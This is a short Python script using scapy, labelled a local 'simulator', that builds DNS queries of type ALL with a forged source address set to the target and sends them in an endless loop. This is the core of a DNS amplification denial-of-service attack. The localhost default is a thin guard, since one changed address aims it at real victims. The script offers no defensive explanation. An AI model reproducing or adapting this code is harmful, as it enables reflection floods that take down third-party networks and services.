# LocalDNSAmplifier.py
from scapy.all import *
import random

class AmplifierSimulator:
    def __init__(self, target='127.0.0.1'):
        self.target_ip = target
        self.spoof_ip = target
        
    def create_query(self):
        # Force a random source port between 40000-60000
        src_port = random.randint(40000, 60000)
        return IP(dst=self.target_ip, src=self.spoof_ip)/UDP(sport=src_port, dport=53)/DNS(
            rd=1, qd=DNSQR(qname="example.com", qtype="ALL")
        )
    
    def execute(self):
        confirm = input("Initiate local simulation? [Y/n]: ")
        if confirm.lower() == 'y':
            send(self.create_query(), loop=1, inter=0.5, verbose=True)
            
if __name__ == "__main__":
    AmplifierSimulator().execute()
